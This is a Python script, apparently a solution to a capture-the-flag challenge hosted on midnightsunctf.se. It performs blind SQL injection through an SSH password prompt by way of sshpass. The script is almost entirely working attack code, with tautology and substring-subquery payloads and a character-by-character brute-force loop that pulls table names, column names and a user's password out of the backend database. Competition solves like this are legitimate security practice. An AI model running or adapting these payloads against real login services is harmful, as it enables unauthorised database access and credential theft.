#!/usr/bin/python3

import subprocess
import sys

pl = "' OR '1'='1"

def run_query(payload):
    cmd = ["sshpass", "-p", payload, "ssh", "-p2222", "fsociety-01.play.midnightsunctf.se"]
    try:
        o = subprocess.check_output(
                cmd,
                stderr=subprocess.STDOUT,
                timeout=1,
                )
    except subprocess.TimeoutExpired as e:
        o = e.output
    except subprocess.CalledProcessError as e:
        return b""
        print("Call '{}' returned error".format('" "'.join(cmd)))
    return o

pl_format = "' OR substring((SELECT DISTINCT(TABLE_NAME) FROM INFORMATION_SCHEMA.COLUMNS ORDER BY TABLE_NAME DESC LIMIT {0},1),{1},1) = '{2}"

#pl = "' OR substring((SELECT DISTINCT(TABLE_NAME) FROM INFORMATION_SCHEMA.COLUMNS ORDER BY TABLE_NAME DESC LIMIT 0,1),1,1) = 'B"

#pl_format = "' OR substring((SELECT DISTINCT(TABLE_NAME) FROM INFORMATION_SCHEMA.COLUMNS ORDER BY TABLE_NAME DESC LIMIT 0,1),4,1) = 'D"

pl_format = "' OR substring((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA <> 'information_schema' LIMIT {0},1),{1},1) = '{2}"
#pl_format = "' OR substring((SELECT username FROM users LIMIT {0},1),{1},1) = '{2}"
pl_format = "' OR substring((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users' LIMIT {0},1),{1},1) = '{2}"
pl_format = "' OR substring((SELECT password FROM users WHERE username = 'elliot' LIMIT {0},1),{1},1) = '{2}"
#pl = "' OR substring((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES ORDER BY CREATE_TIME DESC LIMIT {0},1),{1},1) = '{2}"


chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_!=?/+{}"

def brute_force_schema(success_string, entry_idx = 0, start_character=0):
    result = ""

    i = start_character

    while i < len(chars):
         sys.stdout.write("\r{0}{1}".format(result, chars[i]))
         sys.stdout.flush()

         payload = pl_format.format(entry_idx, len(result) + 1, chars[i])

         data = None
         while data is None or data == b'whiterose hot-standby PHP+MySQL SSH Server\n':
             data = run_query(payload)

         print(data)


         if data.find(success_string) != -1:
             result += chars[i]
             i = 0
         elif data == b"":
             i += 1
         else:
             continue

    i = 0
    sys.stdout.write("\r")
    while i < 80:
       sys.stdout.write(" ")
       i += 1
    sys.stdout.write("\r")

    return result

idx = int(sys.argv[1])
print(brute_force_schema(b"You're not one", idx)) 

print(run_query(pl))
